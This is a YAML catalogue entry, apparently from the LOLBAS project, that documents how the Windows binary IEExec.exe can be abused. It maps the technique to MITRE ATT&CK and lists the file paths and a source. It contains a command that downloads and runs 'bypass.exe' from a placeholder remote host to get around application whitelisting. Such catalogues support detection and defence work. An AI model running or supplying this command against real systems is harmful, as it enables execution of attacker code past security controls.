---
name: Ieexec.exe
description: The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.
functions:
  execute:
    - description: Downloads and executes bypass.exe from the remote server.
      code: ieexec.exe http://x.x.x.x:8080/bypass.exe
      mitreid: T1218
      mitrelink: https://attack.mitre.org/wiki/Technique/T1218
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download and run attacker code from remote location
  download:
    - description: Downloads and executes bypass.exe from the remote server.
      code: ieexec.exe http://x.x.x.x:8080/bypass.exe
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download and run attacker code from remote location
resources:
    - resource: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
fullpath:
    - path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
    - path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
detection:
  - IOC: 
acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
